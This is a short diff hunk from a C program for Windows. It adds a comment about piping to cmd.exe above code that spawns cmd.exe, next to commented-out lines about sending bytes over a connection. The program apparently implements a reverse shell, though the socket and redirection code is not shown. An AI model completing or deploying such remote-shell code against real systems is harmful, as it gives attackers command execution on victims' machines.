@@ -98,6 +98,7 @@ int __cdecl main(int argc, char** argv)
 		//}
 		//printf("Bytes Sent: %ld\n", iResult);
 
+		// WinAPI > pipeing to cmd.exe
 		printf("Spawning process\n");
 		char Process[] = "C:\\Windows\\System32\\cmd.exe";
 		STARTUPINFO sinfo;
